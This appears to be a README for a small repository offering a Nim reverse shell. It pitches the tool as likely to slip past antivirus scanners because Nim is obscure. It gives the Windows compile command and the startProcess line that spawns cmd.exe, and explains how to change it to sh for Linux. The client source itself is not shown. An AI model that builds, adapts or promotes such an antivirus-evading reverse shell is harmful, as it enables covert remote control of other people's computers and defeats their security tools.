# Reverse_Shell_Nim
Just a basic Nim reverse shell

Nim is a beautiful language that isn't yet well know and therefore most antivirsuses will most likely be unable to scan and detect anything malicious. The program I have uploaded is just a simple tcp nim reverse shell that I was playing with a while back. To compile for windows you would do: nim compile -d:mingw --cpu:amd64 --threads:on Client.nim

To compile for linux you have to just change the line: var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})

and change to: var p = startProcess("sh", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})

I also have been working on a nim service program as well a while ago and maybe will add it to this repository.
